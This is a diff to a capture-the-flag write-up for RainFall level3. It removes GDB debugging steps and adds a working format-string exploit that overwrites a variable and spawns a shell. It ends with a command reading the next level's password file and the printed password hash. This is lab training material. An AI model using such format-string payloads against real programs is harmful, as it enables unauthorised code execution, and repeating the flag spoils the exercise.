@@ -1,28 +1,13 @@
 ```
-Start GDB:
-
-gdb ./level2
-Set a breakpoint at the function v() where the value of m is checked:
-
-(gdb) break v
+    python -c 'print("\x8c\x98\x04\x08" + "%60c%4$n")' > /tmp/hh
 ```
 
 ```
-    Run the program in GDB:
-
-    (gdb) run
+    level3@RainFall:~$ (cat /tmp/hh; cat) | ./level3
+    �                                                           
+    Wait what?!
+    whoami
+    level4
+    cat /home/user/level4/.pass
+    b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 ```
-
-```
-    Change the value of m at the point where the breakpoint hits:
-
-    (gdb) set variable m = 64
-```
-
-```
-    Continue execution:
-    (gdb) continue
-```
-
-
-cat /home/user/level4/.pass
